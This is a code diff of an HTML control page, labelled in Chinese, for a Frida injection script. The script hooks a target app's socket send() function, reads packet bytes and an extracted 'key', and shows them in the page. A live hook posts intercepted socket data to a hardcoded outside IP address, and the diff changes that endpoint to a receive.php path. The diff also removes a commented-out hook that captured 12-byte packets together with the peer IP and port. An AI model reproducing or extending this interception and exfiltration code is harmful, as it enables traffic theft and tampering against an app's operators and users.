@@ -274,14 +274,11 @@ input[type=range]:focus::-webkit-slider-runnable-track {
         <br>
         <input class="switch-btn" onclick="startHook1()" type="checkbox">拦截
         <br>
-        <input class="switch-btn" onclick="startHook2()" type="checkbox">拦截1
-        <br>
         <input class="switch-btn" onclick="checkUpdate()" type="checkbox">更新页面
 
         <div id="infoArea" style="margin-top:10px; padding:10px;">
             <p>密钥值: <span id="keyValue">等待获取...</span></p>
             <p>Socket值: <span id="sockValue">等待获取...</span></p>
-            <p>封包数据获取: <input type="text" id="packetData" readonly style="width:100%; margin-top:5px;"></p>
         </div>
 
     </div>
@@ -311,26 +308,6 @@ async function checkUpdate() {
             console.error('更新失败:', error);
         }
     }
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 
 
 
@@ -393,8 +370,6 @@ if(!script) throw "frida注入脚本失败\n\nfrida inject script failed!";
 script.on('message', function(msg) {
 
 
-
-
     if(msg.type=='send' && msg.payload.type=='key_info') {
         document.getElementById('keyValue').textContent = msg.payload.data.key;
         document.getElementById('sockValue').textContent = msg.payload.data.sockfd;
@@ -432,13 +407,6 @@ function startHook() {
 function startHook1() {
     script.call("hook_all_send");
 }
-
-function startHook2() {
-    script.call("hook_send");
-}
-
-
-
 
 
 
@@ -492,56 +460,6 @@ function startHook2() {
     console.log("frida脚本正在运行...\nfrida script is running...");
 
 
-//     rpc.exports.hook_send = function() {
-//     var isHooked = true;
-//     var send_func = h5frida.fishhook("send", 
-//         "int",
-//         ["int", "pointer", "size_t", "int"], 
-//         function(sockfd, buf, len, flags) {
-//             if(isHooked && len == 12) {
-//                 // 读取数据并转换为数组
-//                 var rawData = new Uint8Array(buf.readByteArray(len));
-                
-//                 // 转换为十六进制字符串
-//                 var hexData = Array.from(rawData).map(function(byte) {
-//                     return ('0' + byte.toString(16)).slice(-2);
-//                 }).join(' ');
-                
-//                 // 获取第8位作为密钥
-//                 var keyHex = ('0' + rawData[7].toString(16)).slice(-2);
-                
-//                 // 获取IP和端口
-//                 var sockaddr = Memory.alloc(16);
-//                 var socklen = Memory.alloc(4);
-//                 socklen.writeInt(16);
-//                 var getpeername = new NativeFunction(Module.findExportByName(null, "getpeername"), "int", ["int", "pointer", "pointer"]);
-//                 getpeername(sockfd, sockaddr, socklen);
-                
-//                 var ip = [
-//                     sockaddr.add(4).readU8(),
-//                     sockaddr.add(5).readU8(),
-//                     sockaddr.add(6).readU8(),
-//                     sockaddr.add(7).readU8()
-//                 ].join('.');
-//                 var port = sockaddr.add(2).readU16();
-                
-//                 send({
-//                     type: "packet_info",
-//                     data: {
-//                         fullData: hexData,
-//                         key: keyHex,
-//                         ip: ip,
-//                         port: port
-//                     }
-//                 });
-                
-//                 isHooked = false;
-//             }
-//             return send_func(sockfd, buf, len, flags);
-//         }
-//     );
-//     return "开始拦截12字节数据包";
-//    }
 
 var savedKey = null;
     var savedSockfd = null;
@@ -585,7 +503,7 @@ var savedKey = null;
             }).join(' ');
             
             var xhr = new XMLHttpRequest();
-            xhr.open("POST", "http://http://39.109.122.36/:8080", true);
+            xhr.open("POST", "http://http://39.109.122.36//receive.php", true);
             xhr.setRequestHeader("Content-Type", "application/json");
             xhr.send(JSON.stringify({
                 sockfd: sockfd,
@@ -599,6 +517,7 @@ var savedKey = null;
     );
     return "开始监控send函数";
 };
+
 
 
 
